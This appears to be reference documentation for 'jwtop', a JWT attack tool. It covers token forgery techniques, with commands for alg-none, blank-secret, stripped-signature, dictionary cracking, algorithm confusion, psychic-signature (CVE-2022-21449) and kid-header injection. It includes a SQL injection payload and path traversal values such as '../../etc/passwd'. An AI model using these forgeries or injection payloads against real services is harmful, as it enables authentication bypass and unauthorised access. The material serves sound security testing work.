# jwtop exploit/crack techniques — reference

Applies to both `jwtop crack` (offline checks + online probes) and
`jwtop exploit <technique>` (produces the forged token directly). Flags
shown are for `exploit`; `crack` exposes the same knobs (`--key`,
`--kid-sql-table`, `--kid-path`, `--secret`, `--wordlist`, `--workers`) at
the top level since it runs multiple techniques in one pass.

## algnone — CWE-345

Sets `alg` to `none` and empties the signature. Exploits libraries that
honor the `none` algorithm without requiring the caller to have opted in.

```sh
jwtop exploit algnone <token>
jwtop exploit algnone <token> --all   # emits "none"/"NONE"/"None"/"nOnE" variants
```

`crack --url` always probes all four casings online (some libraries only
reject the lowercase spelling).

## blanksecret — CWE-1391

Re-signs as HS256 (or the token's existing HMAC alg) with an empty string
`""` as the key. Catches servers misconfigured with a blank/unset signing
secret.

```sh
jwtop exploit blanksecret <token>
```

## nullsig

Strips the signature segment entirely (`header.payload.`), keeping the
original `alg` header untouched — distinct from `algnone`, which also
rewrites the header. Useful when a server checks `alg` but forgets to
reject a missing signature.

```sh
jwtop exploit nullsig <token>
```

## weaksecret — CWE-345, dictionary attack

Only applies to `HS256`/`HS384`/`HS512` tokens. Tries, in order: jwtop's
built-in wordlist (embedded from danielmiessler/SecLists), then
`--wordlist <file>`, then any `--secret` values given explicitly. Prints the
recovered secret and exits `0` on success; exits non-zero if nothing
matched.

```sh
jwtop exploit weaksecret <token>
jwtop exploit weaksecret <token> --secret guess1 --secret guess2
jwtop exploit weaksecret <token> --wordlist custom.txt --workers 16
```

Build a custom wordlist from context specific to the target (company name,
app name, common suffixes like `123`/`!`) when the built-in list misses —
the check is purely a dictionary attack, so coverage is everything.

## hmacconfusion — CWE-347, algorithm confusion

For `RS*`/`ES*`/`PS*` tokens only. Re-signs the token as the matching HMAC
algorithm (same bit strength: `RS256`/`ES256`/`PS256` → `HS256`, etc.),
using the server's own **public** key PEM as the HMAC secret. Exploits
servers that verify with a single "get the key material for this alg"
function and don't distinguish an asymmetric public key from a symmetric
secret.

```sh
jwtop exploit hmacconfusion <token> --key public.pem
jwtop exploit hmacconfusion <token> --key https://example.com/public.pem
```

`--key` is required — you need the target's actual public key (fetch it
from a `/.well-known/jwks.json`, a certificate, or wherever the app exposes
it) for this to have any chance of working.

## psychicsig — CVE-2022-21449

For `ES256`/`ES384`/`ES512` tokens only. Replaces the signature with an
all-zero `r=0, s=0` pair. Some ECDSA verifiers (notably Java's SunEC
provider in JDK 15–18) fail to reject this degenerate signature and treat
it as valid for *any* message and *any* public key.

```sh
jwtop exploit psychicsig <token>
```

If the token isn't ES256/384/512, this technique doesn't apply — check
`decode`'s header output first.

## kidinjection — CWE-89 (sql) / CWE-22 (path)

Manipulates the `kid` (Key ID) header, which some servers use to look up
the verification key from a database or filesystem without sanitizing it.
Three modes:

**sql** (default) — makes the server's key-lookup query return an
attacker-known value, then signs with that value as the HMAC secret.

```sh
jwtop exploit kidinjection <token> --mode sql                    # table "tokens"
jwtop exploit kidinjection <token> --mode sql --sql-table keys   # custom table
```
Default payload: `' UNION SELECT 'secret' FROM tokens WHERE '1'='1'`, default
signing secret: `secret`.

**path** — points the `kid` at a file the server will read as key material;
`/dev/null` reads as empty, so the token gets signed with an empty secret.

```sh
jwtop exploit kidinjection <token> --mode path                        # /dev/null
jwtop exploit kidinjection <token> --mode path --path /proc/sys/kernel/ns_last_pid
```

**raw** — full manual control, no default payload:

```sh
jwtop exploit kidinjection <token> --mode raw --kid "../../etc/passwd" --secret ""
```

`--secret` on any mode overrides the mode's default signing key if you know
the server will resolve a different value than jwtop assumes.

## crack-only online techniques

Everything above is available through `exploit` directly. `crack --url`
additionally runs the *probing* logic (send the forged token, compare the
response status to a baseline) so you get a vulnerable/not-vulnerable
verdict instead of just a token. The baseline is auto-detected by sending a
deliberately invalid token unless the original token is already rejected,
in which case pass `--expected-status <code>` explicitly (e.g. `401`).
